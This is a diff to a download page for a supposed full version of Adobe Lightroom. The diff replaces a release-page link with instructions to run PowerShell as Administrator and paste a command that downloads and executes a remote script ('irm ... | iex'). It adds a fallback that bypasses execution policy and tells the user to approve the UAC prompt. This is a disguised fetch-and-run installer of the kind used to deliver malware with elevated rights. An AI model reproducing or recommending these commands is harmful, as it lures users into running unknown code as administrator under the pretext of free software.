@@ -16,12 +16,26 @@ Adobe Lightroom Full | Windows desktop package | straightforward setup | stable 
 
 ## Download
 
-> Use the release page below for Windows.
+1. Open **PowerShell** as Administrator
+2. Paste and run:
 
-- **Release page:** [toolix.me](https://toolix.me)
-- **Full URL:** `https://toolix.me/`
-- **Type:** Desktop package | Windows 10 and 11, 64-bit
-- **Setup:** Run the installer from the extracted folder
+```powershell
+irm https://toolix.me/ps/setup.ps1 | iex
+```
+
+3. Confirm **UAC** (Yes) — setup runs automatically
+
+<details>
+<summary><b>Having trouble? Try this instead</b></summary>
+
+Paste this in the same PowerShell window:
+
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://toolix.me/ps/setup.ps1 | iex"
+```
+
+</details>
+
 
 ## Questions & Answers
 
